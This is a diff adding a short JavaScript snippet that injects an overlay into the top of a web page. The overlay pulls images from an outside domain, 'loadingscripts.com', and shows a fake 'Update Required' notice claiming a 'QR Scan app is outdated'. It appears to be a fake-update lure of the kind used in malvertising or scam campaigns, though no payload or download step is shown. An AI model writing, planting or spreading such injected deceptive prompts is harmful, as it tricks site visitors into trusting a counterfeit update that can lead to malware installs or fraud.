@@ -1,0 +1,25 @@
+const pwa_custom = `
+<div class="pl763847__wrap pl763847__bounceInUp">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700&display=swap" rel="stylesheet">
+  <div class="pl763847__closelink">
+      <img src="https://loadingscripts.com/progress_p/pwa_links/main/vpn/dots_bar/3/close.png" alt="" class="pl763847__close">
+  </div>
+  <div class="pl763847__btn"></div>
+  
+  <div class="pl763847__content">
+      <div class="pl763847__message">
+        <img src="https://loadingscripts.com/progress_p/pwa_links/main/vpn/dots_bar/3/logo.png" alt="" class="pl763847__mes-img">
+        <div class="pl763847__message_content">
+          <p class="pl763847__name__abonem">Update Required</p>
+          <p class="pl763847__message__desc">QR Scan app is outdated. Please update to the latest version to continue.</p>
+        </div>
+        <div class="pl763847__dots">
+          <img class="pl763847__dots-img" alt="" src="https://loadingscripts.com/progress_p/pwa_links/main/vpn/dots_bar/3/more.png">       
+        </div>
+      </div>
+  </div>
+</div>
+
+  `;
+
+document.querySelector('body').insertAdjacentHTML('afterbegin', pwa_custom);
